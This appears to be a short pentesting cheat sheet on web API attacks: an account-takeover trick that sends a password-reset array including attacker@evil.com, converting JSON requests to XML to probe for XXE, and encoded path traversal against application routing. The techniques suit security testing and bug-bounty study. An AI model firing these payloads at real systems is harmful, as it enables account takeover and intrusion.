API
===

## Password reset
```
From: https://hackerone.com/reports/322985
The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address.

POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
```

## JSON to XML to XXE
When the API accept JSON type format payload, then you can try to send the same payload but as a XML file. You can download the Burp extension named "Content Type Converter".
> This extension helps you to modify the JSON request to XML, XML request to JSON and normal form request to JSON in order to play with request and responses.
> https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html

```
PUT /api/search HTTP/1.1
Host: test.com
...
Content-Type: application/json;charset=UTF-8

{
	"message": "xxx"
}
```

```
PUT /api/message HTTP/1.1
Host: test.com
...
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<message>xxx</message>
```

If the request is accepted by the API, then you can try to attack with an XXE payload.


## Exploit application routing

[@samwcyo](twitter.com/samwcyo) explains how to exploit some mis-configuration
on [web routing](https://docs.google.com/presentation/d/1N9Ygrpg0Z-1GFDhLMiG3jJV6B_yGqBk8tuRWO1ZicV8/edit).
That's mean a server may internally call an other resource based on the user URL.
The rewriting can be modify using techniques such as `Directory traversal` (`../`)
or add `Control characters` (%23 (#), %3f (?), %26 (&), %2e (.), %2f (/), %40 (@))
with double or triple encoding in the URL.


He shows some real examples where he can raise an exception on the internal
application using some encoding on control characters:

```
GET /files/lol.png%23 HTTP/1.1
GET /files/..%2f%23 HTTP/1.1
```
